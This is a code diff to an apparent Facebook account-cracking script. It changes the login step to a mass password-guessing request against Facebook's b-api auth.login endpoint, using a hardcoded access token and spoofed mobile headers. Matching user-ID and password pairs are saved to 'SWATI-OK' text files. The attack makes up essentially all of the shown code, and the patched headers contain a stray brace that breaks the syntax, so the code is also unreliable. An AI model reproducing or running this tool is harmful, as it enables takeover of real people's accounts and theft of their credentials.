@@ -859,30 +859,22 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 		])
 		sys.stdout.write(
-			"\r []%s> /Crack>%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+			"\r [Start]%s> /count>%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
 			ses = requests.Session()
-			header_freefb = {'authority': 'p.facebook.com',
-            'method': 'GET',
-            'scheme': 'https',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-US,en;q=0.9,ur-PK;q=0.8,ur;q=0.7,fa-IR;q=0.6,fa;q=0.5',
-            'cache-control': 'max-age=0',
-            'sec-ch-prefers-color-scheme': 'light',
-            'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
-            'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-ch-ua-platform-version': '"10.0.0"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'none',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
-			response = requests.get('https://p.facebook.com/', cookies=cookies, headers=headers)
+			headers = {
+				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
+				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
+				"x-fb-net-hni": str(random.randint(20000, 40000)), 
+				"x-fb-connection-quality": "EXCELLENT",
+				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
+				"user-agent": 'Mozilla/5.0 (Linux; Android 8.1.0; Infinix X5515F Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Mobile Safari/537.36',} 
+				"content-type": "application/x-www-form-urlencoded", 
+				"x-fb-http-engine": "Liger"
+			}
+			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAA" in response.text:
 				print("\r \033[0;92m[SWATI-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats ")
@@ -1298,30 +1290,22 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 	])
 		sys.stdout.write(
-			"\r [Start]>%s/Crack>%s -> \033[1;32mOk:-%s - \033[1;37mCp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+			"\r [Start]>%s/COUNT>%s -> \033[1;32mOk:-%s - \033[1;37mCp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
 			ses = requests.Session()
-			header_freefb ={'authority': 'p.facebook.com',
-            'method': 'GET',
-            'scheme': 'https',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-US,en;q=0.9,ur-PK;q=0.8,ur;q=0.7,fa-IR;q=0.6,fa;q=0.5',
-            'cache-control': 'max-age=0',
-            'sec-ch-prefers-color-scheme': 'light',
-            'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
-            'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-ch-ua-platform-version': '"10.0.0"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'none',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
-			response = requests.get('https://p.facebook.com/', cookies=cookies, headers=headers)
+			headers = {
+				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
+				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
+				"x-fb-net-hni": str(random.randint(20000, 40000)), 
+				"x-fb-connection-quality": "EXCELLENT",
+				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
+				"user-agent": 'Mozilla/5.0 (Linux; Android 8.1.0; Infinix X5515F Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Mobile Safari/537.36',}
+				"content-type": "application/x-www-form-urlencoded", 
+				"x-fb-http-engine": "Liger"
+			}
+			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
 				print("\r \033[0;92m[SWATI-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats ")
@@ -1329,7 +1313,7 @@ class Main:
 				open("2009-SWATI-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[1;32m[SWATI-OK] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;93m[SWATI-OK] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
 				open("2009-SWATI-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
